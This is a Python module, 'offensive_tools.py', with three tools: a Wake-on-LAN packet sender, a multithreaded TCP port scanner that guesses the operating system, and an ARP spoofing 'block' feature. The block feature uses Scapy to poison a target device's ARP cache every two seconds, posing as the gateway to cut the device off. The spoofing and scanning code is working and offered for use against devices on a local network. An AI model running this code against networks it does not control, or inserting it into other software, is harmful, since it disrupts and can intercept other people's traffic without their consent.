"""
offensive_tools.py
Provides Scan (TCP Connect), Block (ARP Spoofing), and Wake (WoL) capabilities.
"""

import socket
import struct
import threading
import time
from queue import Queue

try:
    from scapy.all import ARP, send, conf
    conf.verb = 0  # Disable scapy verbose output
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# ─────────────────────────────────────────────
# WAKE ON LAN (WOL)
# ─────────────────────────────────────────────
def wake_on_lan(mac_address):
    """
    Sends a Wake-on-LAN magic packet to the specified MAC address.
    """
    try:
        # Clean the MAC address
        mac_clean = mac_address.replace(':', '').replace('-', '')
        if len(mac_clean) != 12:
            return {"ok": False, "error": "Invalid MAC address format"}

        # Create the magic packet: 6 bytes of 0xFF followed by 16 repetitions of the MAC
        data = bytes.fromhex('FF' * 6 + mac_clean * 16)
        
        # Broadcast the packet over UDP on port 9
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.sendto(data, ('255.255.255.255', 9))
        sock.close()
        
        return {"ok": True, "message": f"Magic packet sent to {mac_address}"}
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ─────────────────────────────────────────────
# PURE PYTHON PORT SCANNER
# ─────────────────────────────────────────────
COMMON_PORTS = {
    20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "Telnet",
    25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3",
    111: "RPCBind", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
    1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5900: "VNC",
    8000: "HTTP-Alt", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
}

def scan_port(ip, port, timeout, results):
    """Attempt to connect to a single TCP port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        if result == 0:
            results.append({
                "port": port,
                "service": COMMON_PORTS.get(port, "Unknown"),
                "state": "open"
            })
        s.close()
    except Exception:
        pass

def python_port_scan(target_ip, timeout=0.5):
    """
    Multi-threaded TCP connect scan for common ports.
    """
    open_ports = []
    threads = []
    
    # Check if host is valid
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        return {"ok": False, "error": "Invalid IP address"}
        
    for port in COMMON_PORTS.keys():
        t = threading.Thread(target=scan_port, args=(target_ip, port, timeout, open_ports))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    # Sort results by port number
    open_ports.sort(key=lambda x: x["port"])
    
    # Try to guess OS based on open ports
    os_guess = "Unknown Device"
    ports = [p["port"] for p in open_ports]
    if 445 in ports or 3389 in ports or 135 in ports:
        os_guess = "Windows System"
    elif 22 in ports and 445 not in ports:
        os_guess = "Linux/Unix System (or IoT)"
    elif 80 in ports and len(ports) <= 2:
        os_guess = "IoT Device / Web Interface"
        
    return {
        "ok": True, 
        "target": target_ip, 
        "open_ports": open_ports,
        "os_guess": os_guess
    }


# ─────────────────────────────────────────────
# ARP SPOOFING (BLOCK)
# ─────────────────────────────────────────────
_active_blocks = {}
_block_lock = threading.Lock()

def arp_poison_loop(target_ip, target_mac, gateway_ip, stop_event):
    """Continuously send spoofed ARP packets."""
    if not SCAPY_AVAILABLE:
        return
        
    # We tell the Target that WE are the Gateway
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    
    while not stop_event.is_set():
        try:
            send(packet, verbose=False)
            time.sleep(2) # Send every 2 seconds
        except Exception:
            # If standard sockets fail, Scapy might need Npcap.
            pass

def arp_block(target_ip, target_mac, gateway_ip):
    """
    Start blocking a device via ARP spoofing.
    """
    if not SCAPY_AVAILABLE:
        return {"ok": False, "error": "Scapy library not installed or requires admin privileges/Npcap."}
        
    if not gateway_ip:
        return {"ok": False, "error": "Cannot determine network gateway."}
        
    with _block_lock:
        if target_ip in _active_blocks:
            return {"ok": True, "message": f"{target_ip} is already blocked."}
            
        stop_event = threading.Event()
        t = threading.Thread(target=arp_poison_loop, args=(target_ip, target_mac, gateway_ip, stop_event), daemon=True)
        t.start()
        
        _active_blocks[target_ip] = {
            "thread": t,
            "stop_event": stop_event,
            "mac": target_mac
        }
        
    return {"ok": True, "message": f"Started ARP poisoning {target_ip}"}

def arp_unblock(target_ip):
    """
    Stop blocking a device.
    """
    with _block_lock:
        if target_ip in _active_blocks:
            _active_blocks[target_ip]["stop_event"].set()
            del _active_blocks[target_ip]
            return {"ok": True, "message": f"Stopped blocking {target_ip}"}
        return {"ok": False, "error": f"{target_ip} is not currently blocked."}

def get_active_blocks():
    """Return list of currently blocked IPs."""
    with _block_lock:
        return list(_active_blocks.keys())
